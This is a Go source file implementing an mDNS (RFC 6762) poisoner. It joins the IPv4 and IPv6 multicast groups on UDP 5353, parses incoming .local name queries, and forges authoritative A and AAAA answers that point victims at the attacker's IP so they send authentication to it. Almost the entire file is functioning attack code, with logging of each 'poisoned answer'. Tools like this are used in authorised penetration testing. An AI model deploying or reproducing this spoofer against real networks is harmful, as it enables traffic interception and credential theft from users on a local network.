// Package mdns implements an mDNS (Multicast DNS, RFC 6762) poisoner.
//
// When a Windows host resolves a .local name it sends a DNS query to the
// mDNS multicast group 224.0.0.251 (IPv4) and ff02::fb (IPv6) on UDP:5353.
// We listen on both groups, parse the question, and reply with our own IP
// so the victim connects to us for authentication.
//
// Wire format of an mDNS query (standard DNS, RFC 1035 §3.1):
//
//	[TID 2][FLAGS 2][QDCOUNT 2][ANCOUNT 2][NSCOUNT 2][ARCOUNT 2]
//	[QNAME: length-prefixed labels, null-terminated][QTYPE 2][QCLASS 2]
//
// Response:
//
//	TID=0x0000, FLAGS=0x8400 (QR=1 AA=1), QDCOUNT=0, ANCOUNT=1
//	RRNAME=<raw label sequence>, null, TYPE A/AAAA, CLASS IN
//	TTL=120s, RDLENGTH=4/16, RDATA=our IP
package mdns

import (
	"fmt"
	"net"
	"strings"
)

const (
	multicast4 = "224.0.0.251"
	multicast6 = "ff02::fb"
	port       = 5353
	ttl        = 120 // 0x78 — matches "\x00\x00\x00\x78"
)

const (
	qtA    = 0x0001
	qtAAAA = 0x001c
	qtANY  = 0x00ff
)

// Poisoner listens on both mDNS multicast groups and poisons every query.
type Poisoner struct {
	Interface string
	RelayFrom string // if non-empty, only respond to queries from this IP
}

// Run joins IPv4 mDNS multicast and blocks, answering queries.
// IPv6 multicast is started in a background goroutine if a link-local
// address is available on the interface.
func (p *Poisoner) Run() error {
	iface, err := net.InterfaceByName(p.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", p.Interface, err)
	}

	ip4, err := ifaceIPv4(iface)
	if err != nil {
		return err
	}

	// Start IPv6 listener in background when link-local address is available.
	if ip6, err := ifaceIPv6(iface); err == nil {
		go p.runIPv6(iface, ip6)
	}

	group, err := net.ResolveUDPAddr("udp4", fmt.Sprintf("%s:%d", multicast4, port))
	if err != nil {
		return fmt.Errorf("resolve multicast: %w", err)
	}
	conn, err := net.ListenMulticastUDP("udp4", iface, group)
	if err != nil {
		return fmt.Errorf("listen %s:%d on %s: %w", multicast4, port, p.Interface, err)
	}
	defer conn.Close()

	fmt.Printf("\x1b[96m[MDNS]\x1b[0m  Poisoner started  interface=%s  listen=%s:%d  spoof=%s\n",
		p.Interface, multicast4, port, ip4)

	buf := make([]byte, 512)
	for {
		n, src, err := conn.ReadFromUDP(buf)
		if err != nil {
			return fmt.Errorf("read: %w", err)
		}
		pkt := make([]byte, n)
		copy(pkt, buf[:n])
		go p.handleIPv4(conn, pkt, src, ip4)
	}
}

func (p *Poisoner) runIPv6(iface *net.Interface, ip6 net.IP) {
	group, err := net.ResolveUDPAddr("udp6", fmt.Sprintf("[%s]:%d", multicast6, port))
	if err != nil {
		fmt.Printf("[!] \x1b[96m[MDNS]\x1b[0m  IPv6 resolve: %v\n", err)
		return
	}
	conn, err := net.ListenMulticastUDP("udp6", iface, group)
	if err != nil {
		fmt.Printf("[!] \x1b[96m[MDNS]\x1b[0m  IPv6 listen: %v (no IPv6 mDNS)\n", err)
		return
	}
	defer conn.Close()

	buf := make([]byte, 512)
	for {
		n, src, err := conn.ReadFromUDP(buf)
		if err != nil {
			return
		}
		pkt := make([]byte, n)
		copy(pkt, buf[:n])
		go p.handleIPv6(conn, pkt, src, ip6)
	}
}

// handleIPv4 handles a query received on the IPv4 multicast socket.
// Responds to A and ANY queries with an A record (our IPv4 address).
func (p *Poisoner) handleIPv4(conn *net.UDPConn, data []byte, src *net.UDPAddr, ourIP net.IP) {
	if !isQuery(data) {
		return
	}
	name, ok := parseName(data)
	if !ok {
		return
	}
	// Strip IPv4-mapped prefix from what may be a dual-stack source.
	srcIP := strings.TrimPrefix(src.IP.String(), "::ffff:")
	if srcIP == ourIP.String() {
		return
	}
	if p.RelayFrom != "" && srcIP != p.RelayFrom {
		return
	}
	switch qtype(data) {
	case qtA, qtANY:
		conn.WriteToUDP(buildA(data, ourIP), src)
		fmt.Printf("\x1b[96m[MDNS]\x1b[0m  Poisoned answer sent to %s for name %s\n", srcIP, name)
	}
}

// handleIPv6 handles a query received on the IPv6 multicast socket.
// Responds to AAAA queries with an AAAA record (our link-local IPv6 address).
func (p *Poisoner) handleIPv6(conn *net.UDPConn, data []byte, src *net.UDPAddr, ourIP6 net.IP) {
	if !isQuery(data) {
		return
	}
	name, ok := parseName(data)
	if !ok {
		return
	}
	srcIP := src.IP.String()
	if idx := strings.Index(srcIP, "%"); idx >= 0 {
		srcIP = srcIP[:idx]
	}
	if srcIP == ourIP6.String() {
		return
	}
	if p.RelayFrom != "" && srcIP != p.RelayFrom {
		return
	}
	switch qtype(data) {
	case qtAAAA:
		conn.WriteToUDP(buildAAAA(data, ourIP6), src)
		fmt.Printf("\x1b[96m[MDNS]\x1b[0m  Poisoned answer sent to %s for name %s\n", srcIP, name)
	}
}

// isQuery returns true when the DNS packet is a query (QR bit = 0).
// We skip responses to avoid echoing our own poisoned answers.
func isQuery(data []byte) bool {
	return len(data) >= 13 && data[2]&0x80 == 0
}

// parseName decodes the DNS wire-format QNAME from data[12:].
// Returns ("otherhost123.local", true) for a well-formed name.
func parseName(data []byte) (string, bool) {
	if len(data) < 14 {
		return "", false
	}
	pos := 12
	var labels []string
	for pos < len(data) {
		l := int(data[pos])
		if l == 0 {
			break
		}
		if l&0xc0 == 0xc0 { // DNS compression pointer — skip
			break
		}
		pos++
		if pos+l > len(data) {
			return "", false
		}
		labels = append(labels, string(data[pos:pos+l]))
		pos += l
	}
	if len(labels) == 0 {
		return "", false
	}
	return strings.Join(labels, "."), true
}

// nameRaw returns the raw DNS label sequence from data[12:] without the
// null terminator. This is placed verbatim into the answer's RRNAME field.
//
// For a single-question query the packet ends with:
//
//	…labels… 0x00(null) QTYPE(2) QCLASS(2)
//
// So data[12:len-5] is everything from the first label to the last byte of
// the last label — without the trailing null and without QTYPE/QCLASS.
func nameRaw(data []byte) []byte {
	if len(data) < 18 {
		return nil
	}
	end := len(data) - 5 // strip null(1) + QTYPE(2) + QCLASS(2)
	if end <= 12 {
		return nil
	}
	cp := make([]byte, end-12)
	copy(cp, data[12:end])
	return cp
}

// qtype returns the QTYPE from the last 4 bytes of the DNS query packet.
// QTYPE occupies the first 2 bytes of the [QTYPE(2) QCLASS(2)] trailer.
func qtype(data []byte) uint16 {
	l := len(data)
	if l < 4 {
		return 0
	}
	return uint16(data[l-4])<<8 | uint16(data[l-3])
}

// buildA builds an MDNS_Ans packet (A record, IPv4).
//
//	TID=0, Flags=0x8400, QDCOUNT=0, ANCOUNT=1
//	RRNAME=poisonedName, null, TYPE A, CLASS IN, TTL=120, IPLen=4, IP=ourIPv4
func buildA(query []byte, ip net.IP) []byte {
	ip4 := ip.To4()
	name := nameRaw(query)
	pkt := make([]byte, 0, 12+len(name)+1+10)
	pkt = append(pkt, 0x00, 0x00)                       // TID = 0 (always 0 for mDNS)
	pkt = append(pkt, 0x84, 0x00)                       // FLAGS: QR=1, AA=1
	pkt = append(pkt, 0x00, 0x00)                       // QDCOUNT = 0
	pkt = append(pkt, 0x00, 0x01)                       // ANCOUNT = 1
	pkt = append(pkt, 0x00, 0x00)                       // NSCOUNT = 0
	pkt = append(pkt, 0x00, 0x00)                       // ARCOUNT = 0
	pkt = append(pkt, name...)                           // RRNAME (DNS label sequence)
	pkt = append(pkt, 0x00)                             // null terminator
	pkt = append(pkt, 0x00, 0x01)                       // TYPE A
	pkt = append(pkt, 0x00, 0x01)                       // CLASS IN
	pkt = append(pkt, 0x00, 0x00, 0x00, byte(ttl))     // TTL = 120s
	pkt = append(pkt, 0x00, 0x04)                       // RDLENGTH = 4
	pkt = append(pkt, ip4[0], ip4[1], ip4[2], ip4[3]) // RDATA
	return pkt
}

// buildAAAA builds an MDNS6_Ans packet (AAAA record, IPv6).
// Same as MDNS_Ans but TYPE=0x001c and RDLENGTH=16 with a 16-byte IPv6 RDATA.
func buildAAAA(query []byte, ip6 net.IP) []byte {
	ip6b := ip6.To16()
	name := nameRaw(query)
	pkt := make([]byte, 0, 12+len(name)+1+26)
	pkt = append(pkt, 0x00, 0x00)                   // TID = 0
	pkt = append(pkt, 0x84, 0x00)                   // FLAGS: QR=1, AA=1
	pkt = append(pkt, 0x00, 0x00)                   // QDCOUNT = 0
	pkt = append(pkt, 0x00, 0x01)                   // ANCOUNT = 1
	pkt = append(pkt, 0x00, 0x00)                   // NSCOUNT = 0
	pkt = append(pkt, 0x00, 0x00)                   // ARCOUNT = 0
	pkt = append(pkt, name...)                       // RRNAME
	pkt = append(pkt, 0x00)                         // null terminator
	pkt = append(pkt, 0x00, 0x1c)                  // TYPE AAAA
	pkt = append(pkt, 0x00, 0x01)                   // CLASS IN
	pkt = append(pkt, 0x00, 0x00, 0x00, byte(ttl)) // TTL = 120s
	pkt = append(pkt, 0x00, 0x10)                  // RDLENGTH = 16
	pkt = append(pkt, ip6b...)                      // RDATA (16 bytes)
	return pkt
}

// ifaceIPv4 returns the first unicast IPv4 address on iface.
func ifaceIPv4(iface *net.Interface) (net.IP, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}
	for _, a := range addrs {
		var ip net.IP
		switch v := a.(type) {
		case *net.IPNet:
			ip = v.IP
		case *net.IPAddr:
			ip = v.IP
		}
		if ip4 := ip.To4(); ip4 != nil {
			return ip4, nil
		}
	}
	return nil, fmt.Errorf("no IPv4 address on interface %s", iface.Name)
}

// ifaceIPv6 returns the first link-local unicast IPv6 address on iface.
func ifaceIPv6(iface *net.Interface) (net.IP, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}
	for _, a := range addrs {
		var ip net.IP
		switch v := a.(type) {
		case *net.IPNet:
			ip = v.IP
		case *net.IPAddr:
			ip = v.IP
		}
		if ip.To4() == nil && ip.IsLinkLocalUnicast() {
			return ip, nil
		}
	}
	return nil, fmt.Errorf("no IPv6 link-local address on interface %s", iface.Name)
}
